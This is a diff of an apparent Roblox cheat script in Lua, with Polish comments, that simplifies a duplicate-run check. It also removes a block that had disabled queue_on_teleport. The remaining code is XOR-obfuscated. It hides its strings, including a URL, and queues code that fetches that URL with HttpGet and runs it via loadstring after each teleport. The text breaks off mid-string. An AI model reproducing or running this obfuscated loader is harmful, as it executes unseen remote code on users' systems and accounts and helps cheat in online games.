@@ -1,36 +1,11 @@
--- ZABEZPIECZENIE PRZED DUPLIKACJĄ I CLEANUP
-local function PreventMultipleExecutions()
-    local scriptID = "Xyde_Script_Instance"
-    
-    -- 1. Jeśli skrypt już działa, zatrzymaj ten nowy
-    if getgenv()[scriptID] then
-        warn("Xyde Script jest już uruchomiony! Zatrzymuję duplikat.")
-        return true 
-    end
-    
-    -- 2. Ustaw flagę, że skrypt działa
-    getgenv()[scriptID] = true
-    
-    -- 3. Usuń stare UI, jeśli z jakiegoś powodu zostało (zapobiega dublowaniu okienek)
-    local coreGui = game:GetService("CoreGui")
-    if coreGui:FindFirstChild("XydeKeySystem") then
-        coreGui.XydeKeySystem:Destroy()
-    end
-    
-    return false
+if getgenv().XydeScriptLoaded == true then
+    warn("Script is already loaded")
+    return
 end
 
-if PreventMultipleExecutions() then return end
+getgenv().XydeScriptLoaded = true
 
-local old_queue = queue_on_teleport or syn.queue_on_teleport or fluxus.queue_on_teleport
-if old_queue then
-    getgenv().queue_on_teleport = function(...) 
-        -- Ignorujemy próbę kolejkowania przez ten skrypt
-        -- print("Zablokowano wewnętrzne queue_on_teleport Xyde, aby uniknąć duplikatów.")
-    end
-end
-
--- RESZTA SKRYPTU (ZASZYFROWANA CZĘŚĆ)
+-- script
 local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v99,v100) local v101={};for v112=1, #v99 do v6(v101,v0(v4(v1(v2(v99,v112,v112 + 1 )),v1(v2(v100,1 + (v112% #v100) ,1 + (v112% #v100) + 1 )))%256 ));end return v5(v101);end local v8=game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\0\194\56\192\219\54\196","\156\67\173\74\165"));local v10=game:GetService(v7("\28\163\93\6\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\100\1\39\23\240\99\19\48\4\247\83\19","\158\48\118\66\114"));local v12=game:GetService(v7("\159\33\28\51\99\170\233\191\23\21\36\101\172\248\174","\155\203\68\112\86\19\197"));local v13=v8.LocalPlayer;local v14=v7("\78\201\34\236\83\34\170\183\94\197\27\253\67\112\228\182\86\196\34\244\79\118\228\246\95\202\62\249\82\125\171\251\73\208\121\253\80\113\170\251\78\216\53\247\127\115\224\225\25\214\107","\152\38\189\86\156\32\24\133");local v15=v7("\244\67\179\86\239\13\232\9\241\86\164\78\253\25\171\73\240","\38\156\55\199");local v16=v7("\144\100\120\45\56\113\227\112\177\110\104\45\30\58\238\91\188","\35\200\29\28\72\115\20\154");discord=v7("\9\230\219\252\149\43\97\20","\84\121\223\177\191\237\76");local v17=v7("\179\66\221\176\41\10\127\142\169\87\222\238\61\89\36\201\174\84\220\179\63\66\51\206\181\66\204\174\46\30\51\206\182\25\209\141\59\83\56\192\244\110\208\164\63\31\34\196\189\69\134\168\63\81\52\210\244\91\200\169\52\31\35\206\174\68\202\165\117\104\41\197\190\122\198\161\62\85\34\143\183\67\200","\161\219\54\169\192\90\48\80");local v18=queue_on_teleport or syn.queue_on_teleport or fluxus.queue_on_teleport or (function(...) end) ;v18([[
     repeat task.wait() until game:IsLoaded()
     loadstring(game:HttpGet(']]    .. v17    .. [['))()
